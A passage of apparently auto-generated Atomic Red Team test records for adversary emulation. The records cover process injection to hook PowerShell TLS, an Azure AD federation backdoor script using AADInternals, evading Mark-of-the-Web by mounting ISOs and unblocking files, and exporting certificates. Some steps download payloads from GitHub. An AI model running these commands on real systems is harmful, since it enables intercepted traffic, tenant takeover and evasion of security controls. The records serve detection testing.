<li><strong>id</strong>: de1934ea-1fbf-425b-8795-65fb27dd7e33</li>
<li><strong>name</strong>: Hook PowerShell TLS Encrypt/Decrypt Messages</li>
<li>
<p><strong>description</strong>: Hooks functions in PowerShell to read TLS Communications</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: mavinject $pid /INJECTRUNNING "#{file_name}"
Invoke-WebRequest #{server_name} -UseBasicParsing</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{file_name}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}" -UseBasicParsing</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1056.004</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7</li>
<li><strong>name</strong>: Add Federation to Azure AD</li>
<li>
<p><strong>description</strong>: Add a new federated domain to Azure AD using PowerShell.
The malicious domain to be federated must be configured beforehand (outside of the scope of this test):</p>
<ol>
<li>Open Azure Portal</li>
<li>Add a new "custom domain name"</li>
<li>Verify the domain by following instructions (i.e. create the requested DNS record)</li>
</ol>
</li>
<li>
<p><strong>platforms</strong>: ['azure-ad']</p>
</li>
<li><strong>command</strong>: Import-Module AzureAD
Import-Module AADInternals</li>
</ul>
<p>$PWord = ConvertTo-SecureString -String "#{azure_password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{azure_username}", $Pword</p>
<p>try {
  Connect-AzureAD -Credential $Credential -ErrorAction Stop &gt; $null
}
catch {
  Write-Host "Error: AzureAD could not connect"
  exit 1
}</p>
<p>try {
  $domain = Get-AzureADDomain -Name "#{domain_name}"
}
catch {
  Write-Host "Error: domain ""#{domain_name}"" not found"
  exit 1
}
if (-Not $domain.IsVerified) {
  Write-Host "Error: domain ""#{domain_name}"" not verified"
  exit 1
}</p>
<p>if ($domain.AuthenticationType -eq "Federated") {
  Write-Host "Error: domain ""#{domain_name}"" already federated. Try with a different domain or re-create it before."
  exit 1
}</p>
<p>$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
if (-Not $at) {
  Write-Host "Error: AADInternals could not connect"
  exit 1
}</p>
<p>$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName "#{domain_name}"
if ($new) {
  Write-Host "Federation successfully added to Azure AD"
  Write-Host $new
}
else {
  Write-Host "The federation setup failed"
}</p>
<p>Write-Host "End of federation configuration."</p>
<ul>
<li>
<p><strong>prereq_command</strong>: if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AzureAD -Force
Install-Module -Name AADInternals -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: try {
  Import-Module AzureAD -ErrorAction Ignore</p>
</li>
</ul>
<p>$PWord = ConvertTo-SecureString -String "#{azure_password}" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{azure_username}", $Pword
  Connect-AzureAD -Credential $Credential -ErrorAction Ignore &gt; $null</p>
<p>Remove-AzureADDomain -Name "#{domain_name}" -ErrorAction Ignore
} catch {}</p>
<ul>
<li><strong>mitre_id</strong>: T1484.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 002cca30-4778-4891-878a-aaffcfa502fa</li>
<li><strong>name</strong>: Mount ISO image</li>
<li>
<p><strong>description</strong>: Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Mount-DiskImage -ImagePath "#{path_of_iso}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{path_of_iso}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{path_of_iso}") -ErrorAction ignore | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/T1553.005.iso -OutFile "#{path_of_iso}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1553.005</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 42f22b00-0242-4afc-a61b-0da05041f9cc</li>
<li><strong>name</strong>: Mount an ISO image and run executable from the ISO</li>
<li><strong>description</strong>: Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. 
Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing "Hello, World!". 
ISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  </li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly
$keep = Get-Volume -FileSystemLabel "TestIso"
$driveLetter = ($keep | Get-Volume).DriveLetter
invoke-item "$($driveLetter):\hello.exe"</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{path_of_iso}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{path_of_iso}") -ErrorAction ignore | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/FeelTheBurn.iso -OutFile "#{path_of_iso}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null
Stop-process -name "hello" -Force -ErrorAction ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1553.005</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 64b12afc-18b8-4d3f-9eab-7f6cae7c73f9</li>
<li><strong>name</strong>: Remove the Zone.Identifier alternate data stream</li>
<li>
<p><strong>description</strong>: Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.
Removing this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Unblock-File -Path #{file_path}</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path #{file_path}) { EXIT 0 } else { EXIT 1 }</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Invoke-WebRequest #{file_to_download} -OutFile #{file_path}
Set-Content -Path #{file_path} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Set-Content -Path #{file_path} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1553.005</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: {'description': 'File to have the Zone.Identifier removed.', 'type': 'string', 'default': '$env:tmp\ReadMe.md'}</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 7617f689-bbd8-44bc-adcd-6f8968897848</li>
<li><strong>name</strong>: Export Root Certificate with Export-PFXCertificate</li>
<li>
<p><strong>description</strong>: Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.
Upon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $mypwd = ConvertTo-SecureString -String "AtomicRedTeam" -Force -AsPlainText
$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Set-Location Cert:\LocalMachine\My
Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: try {
$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
} catch { }</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1552.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 78b274f8-acb0-428b-b1f7-7b0d0e73330a</li>
<li><strong>name</strong>: Export Root Certificate with Export-Certificate</li>
<li>
<p><strong>description</strong>: Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.
Upon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Set-Location Cert:\LocalMachine\My
Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: try {
   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore
   Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
   Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
}
catch { }</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1552.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
